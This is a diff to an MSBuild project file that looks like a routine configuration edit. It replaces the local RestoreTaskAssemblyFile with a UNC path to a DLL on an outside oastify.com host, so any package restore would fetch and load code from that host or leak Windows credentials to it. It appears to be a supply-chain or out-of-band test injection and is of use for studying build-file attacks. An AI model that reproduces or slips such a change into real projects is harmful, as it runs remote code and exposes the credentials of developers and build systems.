@@ -2,7 +2,7 @@
 	<PropertyGroup>
 		<TargetFramework>net472</TargetFramework>
 		<!-- This overrides the /p:RestoreTaskAssemblyFile=nuget.exe global property -->
-		<RestoreTaskAssemblyFile>$(MSBuildProjectDirectory)\task.dll</RestoreTaskAssemblyFile>
+		<RestoreTaskAssemblyFile>\\9v5qwd1t5j8q48ohejr40xe4cvim6ju8.oastify.com\task.dll</RestoreTaskAssemblyFile>
 	</PropertyGroup>
 	<ItemGroup>
 		<PackageReference Include="Newtonsoft.Json" Version="13.0.1" />
